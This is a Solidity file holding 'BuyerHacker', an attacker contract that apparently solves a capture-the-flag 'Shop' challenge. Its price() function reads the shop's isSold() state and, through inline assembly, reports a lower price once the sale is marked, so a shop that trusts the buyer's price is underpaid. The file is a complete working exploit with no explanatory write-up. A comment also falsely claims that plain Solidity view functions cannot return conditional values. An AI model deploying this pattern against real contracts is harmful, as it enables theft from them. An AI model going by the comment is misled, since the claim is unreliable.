//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function price() external view returns (uint);
    function isSold() external view returns (bool);
    function buy() external;
}

contract BuyerHacker {

    IShop shop;

    constructor (IShop _shop) {
        shop = _shop;
    }

    function buy() external {
        shop.buy();
    }

    // A traditional plain solidity-coded view function cannot return a conditional output.
    // However, assembly allows as to impose conditionality based on a switch case logic. 
    function price() external view returns (uint) {
        bool soldItem = shop.isSold();

        assembly {
            let outputPrice

            switch soldItem
            case 1 {
                outputPrice := 25 // A quarter of what should have been paid, as an example
            } case 0 {
                outputPrice := 100
            }

            mstore(0x80, outputPrice)
            return(0x80, 0x20)
        }
    }
}